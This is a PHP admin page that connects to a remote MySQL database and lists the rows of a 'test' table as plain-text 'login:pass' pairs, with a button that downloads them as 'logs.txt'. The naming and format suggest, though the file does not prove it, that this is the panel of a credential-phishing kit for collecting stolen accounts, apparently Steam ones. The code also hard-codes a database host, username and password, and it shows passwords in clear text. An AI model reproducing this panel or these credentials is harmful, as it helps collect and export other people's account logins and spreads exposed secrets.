<?php session_start ();

if (!$_SESSION['admin']) die ( Запрещено );

?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Админка</title>

</head>
<body>
    <div class=main>
    <form method='POST' action=''>
 <center><input id="b" padding:0 20px; type="submit" name="enter" class="knopka" value="Сохранить в файл"></center>
<center><textarea readonly style="text-align: center; font-size:17px;" name="login" id="content" cols=37 rows=20>
<?php
//<div id="text" style="display:none; position: relative;">Название<br><input style="position: absolute;" type="text" name="main_nazv" id="main_nazv" size=30><br><br><br>';
$db = mysql_connect('mysql.zzz.com.ua', 'steam228', 'Toshiro04') or die(mysql_error());
mysql_select_db('giflex',$db) or die('Could not select database:'.mysql_error());
$result=mysql_query("SELECT * FROM `test`") or die(mysql_error());
while($row=mysql_fetch_array($result))
{
  echo $row['login'];
  echo ":";
  echo $row['pass'];
  echo "\r\n";
}
echo '</textarea>';
mysql_close($db) or die('Could not close connection');
 
echo '</div></form>';
?>
<script>
a = document.createElement("a")
a.setAttribute("href", "data:text/plain," + content.innerHTML)
a.setAttribute("download", "logs.txt")
b.onclick = function(){ a.click() }
</script>
<style>
    @font-face{

font-family: 'ProximaNova';

src: url('../assets/fonts/ProximaNova-Regular.eot');

src: url('../assets/fonts/ProximaNova-Regular.eot?iefix') format('eot'),

url('../assets/fonts/ProximaNova-Regular.woff') format('woff'),

url('../assets/fonts/ProximaNova-Regular.ttf') format('truetype'),

url('../assets/fonts/ProximaNova-Regular.svg#webfont') format('svg');

font-weight: normal;

font-style: normal;

}
    body {
    font-family: ProximaNova;
    background: #272632;
    }
.main {
    padding-top:30px;
    width: 500px;
    margin:0 auto;
    text-align:center;
}
#g {
    float:right;
}
        .knopka {
    font-weight: normal;
    border: none;
    font-size: 18px;
    color: white;
    background-color: #d03352;
    border-radius: 25px;
    padding: 6px 172px;
    text-decoration: none;
    box-shadow:0px 0px 3px 1px black;
    margin:5px 5px;
    margin-bottom:10px;
    }
    .knopka:hover {
     background-color: #D93656;
    }
    textarea {
  padding-top:8px;
  resize: none;
  height:auto;
  max-width:600px;
  color:#17171F;
  font-weight:400;
  font-size:30px;
  width:100%;
  background:#FEB856;
  border-radius:25px;
  line-height:1.3em;
  border:none;
  box-shadow:0px 0px 5px 1px black;
  -webkit-transition: height 2s ease;
-moz-transition: height 2s ease;
-ms-transition: height 2s ease;
-o-transition: height 2s ease;
transition: height 2s ease;
}

* {
  -webkit-font-smoothing:antialiased !important;
}
</style>

